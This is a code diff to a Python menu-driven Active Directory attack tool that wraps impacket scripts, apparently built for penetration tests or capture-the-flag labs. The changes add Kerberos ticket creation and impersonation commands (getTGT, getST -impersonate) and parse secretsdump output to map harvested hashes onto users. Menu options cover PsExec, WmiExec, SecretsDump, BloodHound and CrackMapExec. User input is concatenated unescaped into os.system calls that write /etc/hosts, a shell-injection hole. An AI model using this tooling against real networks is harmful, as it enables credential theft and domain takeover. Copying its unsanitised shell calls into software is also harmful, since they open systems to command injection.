@@ -86,7 +86,7 @@ def gettime(value):
    return variable
 
 def command(command):
-#   print colored("Using Command: " + command + "\n", 'white')	# COMMENT OUT TO STOP DEBUGGING COMMANDS
+   print colored("Using Command: " + command + "\n", 'white')	# COMMENT OUT TO STOP DEBUGGING COMMANDS
    os.system(command)
    raw_input("\nPress ENTER to continue...")
    return
@@ -259,16 +259,16 @@ def display():
 
 # ----------------------------------------------------------------------------------------------------------------------------------------------------
 
-   print u'\u2551' + "(0) Save/Exit          (10) Re/Set WIN COMMAND (20) GetArch  (30) Enum4Linux     (40) Gold Ticket    (50) Domain Dump  (60) FTP     " + u'\u2551'
-   print u'\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set CLOCK TIME  (21) NetView  (31) WinDapSearch   (41) Silver Ticket  (51) BLOODHOUND   (61) SSH     " + u'\u2551'
-   print u'\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set DIRECTORY   (22) Services (32) LookupSid      (42) GetUsersPns    (52) ACLPWN       (62) TelNet  " + u'\u2551'
-   print u'\u2551' + "(3) Re/Set USERNAME    (13) Check Connection   (23) AtExec   (33) SamDump Users  (43) GetAdusers     (53) SecretsDump  (63) NetCat  " + u'\u2551'
-   print u'\u2551' + "(4) Re/Set PASSWORD    (14) Check DNS Records  (24) DcomExec (34) RpcDump        (44) KerbChecKUsers (54) CrackMapExec (64) WinRem  " + u'\u2551'
-   print u'\u2551' + "(5) Re/Set FOREST NAME (15) Check DNS SERVER   (25) PsExec   (35) REGistery      (45) GetNPUsers     (55) WmiExec HASH (65)         " + u'\u2551'
-   print u'\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap O/S + Skew    (26) SmbExec  (36) SmbClient      (46)                (56)              (66)         " + u'\u2551'
-   print u'\u2551' + "(7) Re/Set WORK GROUP  (17) Nmap Subdomains    (27) WmiExec  (37) SmbMap SHARE   (47)                (57)              (67)         " + u'\u2551'
-   print u'\u2551' + "(8) Re/Set SHARE NAME  (18) Nmap Intense TCP   (28) IfMap    (38) SmbMount SHARE (48)                (58)              (68)         " + u'\u2551'
-   print u'\u2551' + "(9) Re/Set IMPERSONATE (19) Nmap Slow and Full (29) OpDump   (39) Rpc Client     (49)                (59)              (69)         " + u'\u2551'
+   print u'\u2551' + "(0) Save/Exit          (10) Re/Set WIN COMMAND (20) GetArch  (30) Enum4Linux     (40) Create TGT      (50) Domain Dump  (60) FTP    " + u'\u2551'
+   print u'\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set CLOCK TIME  (21) NetView  (31) WinDapSearch   (41) TGT IMPERSONATE (51) BLOODHOUND   (61) SSH    " + u'\u2551'
+   print u'\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set DIRECTORY   (22) Services (32) LookupSid      (42) GetUsersPns     (52) ACLPWN       (62) TelNet " + u'\u2551'
+   print u'\u2551' + "(3) Re/Set USERNAME    (13) Check Connection   (23) AtExec   (33) SamDump Users  (43) GetAdusers      (53) SecretsDump  (63) NetCat " + u'\u2551'
+   print u'\u2551' + "(4) Re/Set PASSWORD    (14) Check DNS Records  (24) DcomExec (34) RpcDump        (44) KerbChecKUsers  (54) CrackMapExec (64) WinRem " + u'\u2551'
+   print u'\u2551' + "(5) Re/Set FOREST NAME (15) Check DNS SERVER   (25) PsExec   (35) REGistery      (45) GetNPUsers      (55) WmiExec HASH (65)        " + u'\u2551'
+   print u'\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap O/S + Skew    (26) SmbExec  (36) SmbClient      (46)                 (56)              (66)        " + u'\u2551'
+   print u'\u2551' + "(7) Re/Set WORK GROUP  (17) Nmap Subdomains    (27) WmiExec  (37) SmbMap SHARE   (47)                 (57)              (67)        " + u'\u2551'
+   print u'\u2551' + "(8) Re/Set SHARE NAME  (18) Nmap Intense TCP   (28) IfMap    (38) SmbMount SHARE (48)                 (58)              (68)        " + u'\u2551'
+   print u'\u2551' + "(9) Re/Set IMPERSONATE (19) Nmap Slow and Full (29) OpDump   (39) Rpc Client     (49)                 (59)              (69)        " + u'\u2551'
    print u'\u255A' + (u'\u2550')*132 + u'\u255D'
 
 # -------------------------------------------------------------------------------------
@@ -373,7 +373,9 @@ US   = []
 PA   = []
 US   = [X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1] # 40 USERNAMES
 PA   = [X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2] # 40 PASSWORDS
+
 MAX  = 39
+ADD  = 0
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -579,6 +581,14 @@ while True:
          HST = BAK      
       else:
          HST = padding(HST, COL1)
+         if ADD == 1:
+            os.system("sed -i '$d' /etc/hosts")
+            os.system("echo '" + TIP.rstrip(" ") + "\t" + HST.rstrip(" ") + "' >> /etc/hosts")
+         else:
+            os.system("echo '" + TIP.rstrip(" ") + "\t" + HST.rstrip(" ") + "' >> /etc/hosts")
+            ADD = 1
+         command("echo '\nDOMAIN " + HST.rstrip(" ") + " has been added to /etc/hosts'")
+
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
@@ -1104,7 +1114,7 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - getTGT.py megabank.local/melanie:Welcome123!
+# Details : Menu option selected - getTGT.py DOMAIN/USER:PASSWORD
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1120,7 +1130,8 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '41':
-      command(PRO + "getST.py -impersonate " + POR.strip(" ") + " -spn cifs/" + HST.rstrip(" ") + " " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
+      temp = USR.rstrip(" ") + ".ccache"
+      command(PRO + "getST.py -spn " + temp + " -impersonate " + POR.rstrip(" ") + " " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1300,12 +1311,15 @@ while True:
       for x in range(0,count2):
          test = linecache.getline("SECRETS.tmp",x+1)
          test = test.replace(":::","")
-         test = test.replace(HST.rstrip(" ")+"\\","")
-         get1,get2,get3,get3 = test.split(":")
-         get3 = padding(get3,COL4) 
-         for x in range (0,MAX):
-            if US[x].rstrip(" ") == get1:
-               PA[x] = get3
+         temp = HST.rstrip(" ") + "\\"
+         test = test.replace(temp,"")
+         get1,get2,get3,get4 = test.split(":")
+         get1 = padding(get1,COL3) # USER
+         get4 = padding(get4,COL4) # PASSWORD
+
+         for y in range (0, MAX):
+            if US[y] == get1:
+               PA[y] = get4
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
